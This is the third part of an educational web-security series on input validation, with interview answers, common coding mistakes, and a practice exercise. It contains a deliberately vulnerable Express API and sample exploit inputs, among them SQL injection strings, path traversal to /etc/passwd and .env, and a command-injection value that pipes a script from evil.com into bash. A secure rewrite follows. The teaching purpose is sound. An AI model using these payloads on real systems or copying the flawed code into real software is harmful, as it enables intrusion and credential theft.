# Input Validation — Part 3 of 3

### Sections: 9 (Interview Prep), 10 (Common Developer Mistakes), 11 (Quick Revision), 12 (Security Thinking Exercise)

**Series:** Authentication & Security → Topic 08

---

## SECTION 9 — Interview Prep: Layered Answers

### Beginner Level

**Q: What is SQL injection and how do you prevent it?**

```
SQL injection happens when user input is concatenated into a SQL query,
and the attacker uses SQL syntax to modify the query's logic.

Example:
  Query: SELECT * FROM users WHERE username='alice' AND password='secret'
  Attacker input for username: alice' --
  Modified query: SELECT * FROM users WHERE username='alice' --' AND password='x'
  The -- comments out the password check. The attacker logs in without a password.

Prevention: Parameterized queries (also called prepared statements).
  The query structure and data are sent to the database separately:

  db.query('SELECT * FROM users WHERE username = $1 AND password = $2', [username, password]);

  The database receives placeholders ($1, $2) in the query structure,
  and the actual values separately as data — never parsed as SQL syntax.
  No matter what the user types, it's treated as a literal string value.
  SQL injection becomes impossible.
```

**Q: What is the difference between allowlist and denylist validation?**

```
Denylist: List of bad inputs to block. Everything else is allowed.
  Example: block ' ; -- < > <script>
  Problem: The list of "bad" inputs is infinite. Attackers find new bypasses:
           Unicode lookalikes: ʼ (U+02BC) looks like apostrophe
           Encoding: %27 → ' (URL decode after your filter)
           New attack techniques you haven't added to your list yet.

Allowlist: Define exactly what GOOD input looks like. Block everything else.
  Example: /^[a-zA-Z0-9_-]{3,30}$/ matches only: letters, numbers, underscore, hyphen.
  Anything else (quotes, semicolons, angle brackets, new attack vectors) → rejected.
  Problem: just doesn't match your pattern. Can't bypass it.

RULE: Always validate with allowlists. Use denylist only as defense-in-depth, never primary.
```

---

### Intermediate Level

**Q: Can an ORM protect you from SQL injection completely?**

```
Mostly yes, but not completely. Three scenarios where ORMs don't protect you:

1. Raw queries:
   ORMs let you run raw SQL for complex queries.
   If you concatenate user input into raw SQL: SQL injection.
   FIX: Use the ORM's parameterized raw query helper.
   Safe: db.execute(sql`SELECT * FROM users WHERE name = ${name}`)
   Unsafe: db.execute(`SELECT * FROM users WHERE name = '${name}'`)

2. Dynamic column/table names:
   Column names and table names can't be bound as parameters.
   If you build: ORDER BY ${req.query.sortBy} → SQL injection for the sort column.
   FIX: Allowlist mapping.
   Safe: const col = { username: 'username', email: 'email' }[req.query.sortBy];

3. Operator injection in NoSQL (not SQL):
   ORM for MongoDB: User.findOne({ username, password }) where password is { $gt: "" }
   → Authentication bypass.
   FIX: Validate types before passing to any DB query. String(req.body.password).

RULE: ORM + parameterized queries + input validation = strong protection.
      ORM alone assumes developers never use raw queries correctly.
```

**Q: How do you validate a file upload safely?**

```
File uploads are one of the most dangerous inputs. Validate at every layer:

1. FILE TYPE: Never trust MIME type from Content-Type header (user-controlled).
   Read the file's magic bytes (first N bytes of the file content itself).
   npm package `file-type` reads actual file content to determine type.
   Only accept: image/jpeg, image/png (or whatever your app needs).
   Reject: text/html, application/javascript, .exe, .php

2. FILE SIZE: Reject before full upload if Content-Length exceeds limit.
   Enforce again after receiving (Content-Length can be fake).

3. FILENAME: Never use the original filename on disk.
   Generate a UUID: `${uuidv4()}.${safeExtension}`
   Store original name in DB for display. Use UUID on disk.
   Prevents: path traversal (../), null bytes, very long filenames.

4. FILE CONTENT: Scan with antivirus (ClamAV, AWS Inspector) for malware.
   If images: re-encode with Sharp (strips malicious EXIF, ensures clean image).

5. STORAGE: Upload to S3, serve via CloudFront with signed URLs.
   Never serve files from the same origin as your app (prevents content-type sniffing XSS).
   Set Content-Disposition: attachment (forces download, not rendering).
```

---

### Senior/Advanced Level

**Q: How do you design a validation layer for a high-traffic API with complex business rules?**

```
LAYERED VALIDATION STRATEGY:

LAYER 1 — STRUCTURAL VALIDATION (at entry point, fast fails):
  Zod schema: type checking, length limits, format validation.
  Runs BEFORE hitting the database. Cheap: no I/O. Rejects obviously invalid data immediately.
  Example: email must be valid format, username must match /^[a-zA-Z0-9_-]+$/, age 13-120.
  Response: 400 Bad Request with field-specific errors.

LAYER 2 — BUSINESS RULE VALIDATION (after DB reads):
  Requires database: check if email already exists, verify referential integrity.
  Called only if structural validation passes.
  Example: "A user with this email already exists" — requires a DB query to determine.
  Response: 409 Conflict or 422 Unprocessable Entity.

LAYER 3 — PARAMETERIZED DB QUERIES (at DB layer):
  All SQL queries use parameters. No exceptions.
  Column names from allowlists only.
  DB user: least privilege.

LAYER 4 — OUTPUT ENCODING (at response layer):
  All output escaped for context where it's used.
  API JSON: no raw HTML in response fields.

PERFORMANCE:
  Zod parsing: <1ms for typical payloads.
  "Validation is too slow" is a myth for properly written schemas.
  Validation runs BEFORE DB queries — bad actors don't reach your DB.
  For truly high-volume: compile Zod schemas once at startup (not per-request).

TESTING:
  Test each schema with valid inputs (should pass) + invalid inputs (should fail).
  fuzz test boundary values: max length ± 1, special characters, Unicode, empty string.
  Use property-based testing (fast-check) to discover edge cases.
```

---

## SECTION 10 — 10 Common Developer Mistakes

### Mistake 1: String Concatenation in SQL Queries

```javascript
// WRONG:
const query = `SELECT * FROM users WHERE email='${email}' AND password='${pass}'`;

// RIGHT:
const result = await db.query(
  "SELECT * FROM users WHERE email = $1 AND password_hash = $2",
  [email, passwordHash],
);
```

### Mistake 2: Trusting Client-Provided IDs

```javascript
// WRONG: using client-provided user ID directly
app.delete("/api/posts/:postId", authenticate, async (req, res) => {
  const { userId } = req.body; // User says "I'm userId=1 (admin)"
  await db.query("DELETE FROM posts WHERE id=$1 AND user_id=$2", [
    req.params.postId,
    userId,
  ]);
});

// RIGHT: use the authenticated user's ID from the session/JWT — never from the request body
app.delete("/api/posts/:postId", authenticate, async (req, res) => {
  const userId = req.user.id; // From verified JWT/session — attacker cannot forge this
  await db.query("DELETE FROM posts WHERE id=$1 AND user_id=$2", [
    req.params.postId,
    userId,
  ]);
});
```

### Mistake 3: parseInt Without Validation

```javascript
// WRONG: parseInt("10; DROP TABLE", 10) === 10 — parseInt ignores trailing content
const limit = parseInt(req.query.limit);
// Also: parseInt("1.5") = 1, parseInt("") = NaN

// RIGHT: Zod coerce with constraints
const schema = z.object({
  limit: z.coerce.number().int().min(1).max(100).default(20),
});
const { limit } = schema.parse(req.query);
```

### Mistake 4: JSON.parse Without Validation

```javascript
// WRONG: Trust that parsed JSON matches expected structure
const data = JSON.parse(req.body.data);
const { userId, role } = data;
// data could be: { "userId": "admin", "role": "admin" } — attacker-controlled

// RIGHT: Validate schema after parsing
const DataSchema = z.object({
  userId: z.string().uuid(),
  role: z.enum(["user", "editor"]), // Admin role not in enum — can't be injected
});
const data = DataSchema.parse(JSON.parse(req.body.data));
```

### Mistake 5: Regex ReDoS (Catastrophic Backtracking)

```javascript
// WRONG: Vulnerable regex — exponential backtracking on crafted input
const EMAIL_REGEX =
  /^([a-zA-Z0-9]+\.)*[a-zA-Z0-9]+@[a-zA-Z0-9]+\.([a-zA-Z0-9]+\.)*[a-zA-Z]+$/;
// Input: "aaaaaaaaaaaaaaaaaaaaX" → catastrophic backtracking → Node.js event loop frozen

// RIGHT: Use Zod's built-in .email() which uses a safe, non-backtracking regex
const schema = z.object({ email: z.string().email() });
// OR: Use a library proven against ReDoS: validator.js isEmail()
```

### Mistake 6: Exposing SQL Errors to Client

```javascript
// WRONG: Raw DB errors exposed to user
app.post("/login", async (req, res) => {
  try {
    const user = await db.query(query);
  } catch (err) {
    res.status(500).json({ error: err.message }); // "column 'foo' does not exist in table 'users'"
    // Error reveals: column names, table names, DB type, query structure
    // Goldmine for attacker crafting SQL injections
  }
});

// RIGHT: Log detailed error server-side, return generic error to client
app.post("/login", async (req, res) => {
  try {
    const user = await db.query(query);
  } catch (err) {
    logger.error({ event: "DB_ERROR", error: err.message, stack: err.stack });
    res.status(500).json({ error: "INTERNAL_ERROR" }); // Nothing useful for attacker
  }
});
```

### Mistake 7: Skipping Validation on Internal Endpoints

```javascript
// WRONG: "It's an internal microservice — no validation needed"
// Internal service-to-service calls:
app.post("/internal/process-job", async (req, res) => {
  const { userId, action } = req.body; // No validation
  await processJobForUser(userId, action); // sql: WHERE user_id = ${userId}
});
// Internal services get compromised (SSRF, supply chain).
// If your own frontend gets XSS: it can call internal endpoints.

// RIGHT: Validate all inputs regardless of source
// Internal endpoints get the same Zod schema validation as external ones.
```

### Mistake 8: Forgotten Nested Object Properties

```javascript
// WRONG: Validate top-level but miss nested objects
const schema = z.object({
  name: z.string().max(100),
  address: z.object({
    street: z.string(),
    // city not validated — attacker can set city to a 10MB string
  }),
});
// address.city: z string() with no max() → 10MB inputs accepted

// RIGHT: Validate every field at every nesting level, always with constraints
const schema = z.object({
  name: z.string().max(100),
  address: z.object({
    street: z.string().max(200),
    city: z.string().max(100),
    country: z
      .string()
      .length(2)
      .regex(/^[A-Z]{2}$/), // ISO 3166-1 alpha-2
    postalCode: z
      .string()
      .max(20)
      .regex(/^[a-zA-Z0-9 -]+$/),
  }),
});
```

### Mistake 9: Using User Input in Dynamic Imports or require()

```javascript
// WRONG: User-controlled module name in require/import
app.get("/api/plugin/:name", (req, res) => {
  const plugin = require(`./plugins/${req.params.name}`); // Path traversal + arbitrary code load
  plugin.run();
});
// name = "../../../../etc/hosts" → path traversal
// name = "malicious-package" → if it exists in node_modules, loads it

// RIGHT: Allowlist of registered plugins only
const REGISTERED_PLUGINS = {
  chart: "./plugins/chart.js",
  table: "./plugins/table.js",
  map: "./plugins/map.js",
};
app.get("/api/plugin/:name", (req, res) => {
  const pluginPath = REGISTERED_PLUGINS[req.params.name];
  if (!pluginPath) return res.status(404).json({ error: "PLUGIN_NOT_FOUND" });
  const plugin = require(pluginPath);
  plugin.run();
});
```

### Mistake 10: Type Coercion Surprises in Comparisons

```javascript
// WRONG: JavaScript type coercion in security comparisons
if (req.body.isAdmin == true) {  // == not ===
  // "1" == true is TRUE in JavaScript
  // "yes" == true is FALSE but "true" == true is FALSE too
  // Unexpected behaviors depending on input type
}

// Also: array injection
// req.body.userId = ["admin", "user123"]
// User.findOne({ username: userInput }) where userInput = ["admin"]
// MongoDB: { username: ["admin"] } — behavior depends on driver version

// RIGHT: Always use ===, always validate type first
const { isAdmin } = z.object({ isAdmin: z.boolean() }).parse(req.body);
if (isAdmin === true) { ... }

// For IDs: coerce to the expected primitive type
const userId = z.string().uuid().parse(req.body.userId);  // Ensures it's a string UUID, not array
```

---

## SECTION 11 — Quick Revision

### 10 Key Takeaways

1. **Allowlist, not denylist**: Define what good input looks like. Reject everything else. Denylist is always incomplete.

2. **Parameterized queries are non-negotiable**: Every SQL query with external input uses parameters. No exceptions. No string concatenation.

3. **Validate at every layer**: Entry point (Zod schemas), business logic, database layer. Don't assume upstream validated.

4. **Column/table names can't be parameterized**: Must come from application-side allowlist maps. Never from user input directly.

5. **Never expose DB/stack errors to clients**: Log details server-side. Return generic error message. Errors reveal table names, columns, DB type — attacker's reconnaissance.

6. **File uploads**: Never use original filename on disk. Validate magic bytes (not MIME header). Re-encode images. Serve from separate origin (S3/CloudFront) — never from app server.

7. **Path traversal**: Resolve full path with `path.resolve()`. Verify it starts with the intended base directory. Reject if outside.

8. **Command injection**: Use `execFile()` with argument array — never `exec()` with string concatenation. Validate input with allowlist regex before system calls.

9. **NoSQL injection**: Never pass raw request objects to DB queries. Coerce to expected primitive types. Use schema validation before query.

10. **ORM doesn't fully protect**: Raw queries, dynamic ordering, and NoSQL operators still require explicit validation and parameterization.

---

### 30-Second Interview Answer

**"How do you prevent injection attacks?"**

```
"Injection attacks happen when user-controlled data is treated as code — SQL, shell commands,
file paths, template expressions.

My defense is three layers:
First: allowlist validation at every entry point using Zod schemas —
       type checking, format constraints, regex patterns on every input field.
       Anything not matching the expected pattern is rejected at the boundary.

Second: parameterized queries for all database access —
        user input is never concatenated into SQL strings.
        For column or table names that can't be parameterized: fixed allowlist maps in code.

Third: server-side input context awareness —
       when input goes into file paths, I verify the resolved path stays in the intended directory.
       When calling system commands, I use execFile with argument arrays (never shell string).

And: never expose DB error details to clients — log them, return generic error to user."
```

---

### Mnemonics

```
INJECT (Core threats):
  I — Injection target: SQL, NoSQL, Command, Path, SSTI
  N — Never concatenate user input into queries/commands/paths
  J — Just parameterize (prepared statements, argument arrays)
  E — Explicit allowlist for column/table names
  C — Check all paths with resolve() and startsWith()
  T — Type-enforce input (Zod schema before any processing)

PARAM (SQL safety):
  P — Parameterized queries: $1, $2 / ? placeholders
  A — All dynamic values as parameters (never in string)
  R — Reject if Zod fails. Don't reach DB with invalid input.
  A — Allowlist for table/column names (can't be parameterized)
  M — Minimum privilege DB user (no DROP, no FILE)
```

---

## SECTION 12 — Security Thinking Exercise

### Scenario: SearchEngine Mini — API Server

A startup's search and user management API:

```javascript
// app.js
import express from "express";
import mysql from "mysql2/promise";
import { exec } from "child_process";

const pool = await mysql.createPool({
  host: "db",
  user: "root",
  password: "root",
  database: "app",
});

app.get("/api/users/search", async (req, res) => {
  const { query, role, sortBy, direction } = req.query;

  const sql = `SELECT id, username, email, role 
               FROM users 
               WHERE username LIKE '%${query}%' 
               AND role = '${role}'
               ORDER BY ${sortBy} ${direction}`;
  try {
    const [rows] = await pool.query(sql);
    res.json(rows);
  } catch (err) {
    res.status(500).json({ error: err.message }); // "Table 'app.users' doesn't exist..."
  }
});

app.post("/api/reports/generate", authenticate, async (req, res) => {
  const { filename, format } = req.body;

  exec(
    `generate-report --format=${format} --output=/tmp/${filename}.pdf`,
    (err, stdout) => {
      if (err) return res.status(500).json({ error: err.message });
      res.json({ message: "Report generated", path: `/tmp/${filename}.pdf` });
    },
  );
});

app.get("/api/files/download", authenticate, async (req, res) => {
  const { path: filePath } = req.query;
  res.sendFile(filePath); // "Simple — just send whatever path they ask for"
});
```

---

### Your Task

**Identify all injection vulnerabilities and their exploits. Provide the secure rewrite.**

---

### Analysis: Problems Found

```
PROBLEM 1: SQL Injection in /users/search (CRITICAL — 3 injection points)
  - query: LIKE '%${query}%' → ' UNION SELECT password_hash, null, null FROM users -- %
  - role: AND role = '${role}' → ' OR '1'='1
  - sortBy/direction: ORDER BY ${sortBy} ${direction} → sortBy can be any expression

PROBLEM 2: Command Injection in /reports/generate (CRITICAL)
  exec() with string interpolation.
  format = "pdf; curl https://evil.com/shell | bash > /dev/null 2>&1"
  → Executes arbitrary commands on the server.
  filename = "../../../root/.ssh/authorized_keys"
  → Command writes to SSH authorized_keys file.

PROBLEM 3: Path Traversal in /files/download (CRITICAL)
  req.query.path passed directly to res.sendFile().
  path = "../../etc/passwd" → Returns /etc/passwd
  path = "../../app/.env"  → Returns database passwords, JWT secrets

PROBLEM 4: Error message exposes DB schema (HIGH)
  err.message sent directly to client.
  Reveals: table names, column names, DB type, query structure.
  Attacker maps your DB schema via error messages, then crafts precise SQL injections.
```

### Secure Rewrite

```javascript
// app.js — SECURE VERSION
import express from "express";
import mysql from "mysql2/promise";
import { execFile } from "child_process";
import { z } from "zod";
import path from "path";

const pool = await mysql.createPool({
  host: process.env.DB_HOST,
  user: process.env.DB_USER, // Not 'root' — least privilege user
  password: process.env.DB_PASS,
  database: "app",
});

// ALLOWED values — application-defined, never user-defined
const ALLOWED_ROLES = ["user", "editor", "viewer"];
const ALLOWED_SORT_COLUMNS = {
  username: "username",
  email: "email",
  created_at: "created_at",
};
const ALLOWED_DIRECTIONS = { asc: "ASC", desc: "DESC" };
const ALLOWED_REPORT_FORMATS = ["pdf", "csv", "excel"];
const DOWNLOAD_BASE_DIR = path.resolve("/app/reports");

// Zod schemas
const SearchSchema = z.object({
  query: z
    .string()
    .max(100)
    .regex(/^[a-zA-Z0-9 _@.-]*$/), // Only safe chars
  role: z.enum(["user", "editor", "viewer"]),
  sortBy: z.enum(["username", "email", "created_at"]).default("username"),
  direction: z.enum(["asc", "desc"]).default("asc"),
});

const ReportSchema = z.object({
  filename: z
    .string()
    .max(100)
    .regex(/^[a-zA-Z0-9_-]+$/), // No path chars
  format: z.enum(["pdf", "csv", "excel"]),
});

// /users/search — SECURE
app.get("/api/users/search", async (req, res) => {
  const parsed = SearchSchema.safeParse(req.query);
  if (!parsed.success) return res.status(400).json({ error: "INVALID_PARAMS" });

  const { query, role, sortBy, direction } = parsed.data;
  const sortColumn = ALLOWED_SORT_COLUMNS[sortBy];
  const sortDirection = ALLOWED_DIRECTIONS[direction];

  try {
    // query uses LIKE with parameterized value — % prefix/suffix are safe here
    const [rows] = await pool.execute(
      `SELECT id, username, email, role FROM users 
       WHERE username LIKE ? AND role = ? 
       ORDER BY ${sortColumn} ${sortDirection}`,
      [`%${query}%`, role],
    );
    res.json(rows);
  } catch (err) {
    logger.error({ event: "DB_ERROR", error: err.message });
    res.status(500).json({ error: "SEARCH_FAILED" }); // Generic — no DB details
  }
});

// /reports/generate — SECURE
app.post("/api/reports/generate", authenticate, async (req, res) => {
  const parsed = ReportSchema.safeParse(req.body);
  if (!parsed.success) return res.status(400).json({ error: "INVALID_PARAMS" });

  const { filename, format } = parsed.data;
  const safeOutput = `/tmp/${filename}.${format}`;

  // execFile: no shell, --format and output are separate arguments (not shell-interpolated)
  execFile(
    "generate-report",
    ["--format", format, "--output", safeOutput],
    { timeout: 30000 },
    (err, stdout) => {
      if (err) {
        logger.error({ event: "REPORT_ERROR", error: err.message });
        return res.status(500).json({ error: "REPORT_FAILED" });
      }
      res.json({ message: "Report generated" });
    },
  );
});

// /files/download — SECURE
app.get("/api/files/download", authenticate, async (req, res) => {
  const filename = req.query.filename; // Only filename, not a full path

  if (!filename || /[\/\\]/.test(filename) || filename.includes("..")) {
    return res.status(400).json({ error: "INVALID_FILENAME" });
  }

  const fullPath = path.resolve(DOWNLOAD_BASE_DIR, filename);

  // Ensure path stays within intended directory
  if (!fullPath.startsWith(DOWNLOAD_BASE_DIR + path.sep)) {
    return res.status(403).json({ error: "ACCESS_DENIED" });
  }

  res.sendFile(fullPath); // path validated and confined
});

// CHANGES:
// 1. All SQL queries: parameterized (?, not string concat)
// 2. sortBy/direction: allowlist mapping in application code
// 3. exec() → execFile() with argument array (no shell)
// 4. filename, format: Zod enum validation (only allowed values accepted)
// 5. File download: only filename accepted, full path built server-side + validated
// 6. DB errors: logged, generic message returned to client
// 7. DB user: least privilege account (not root)
```
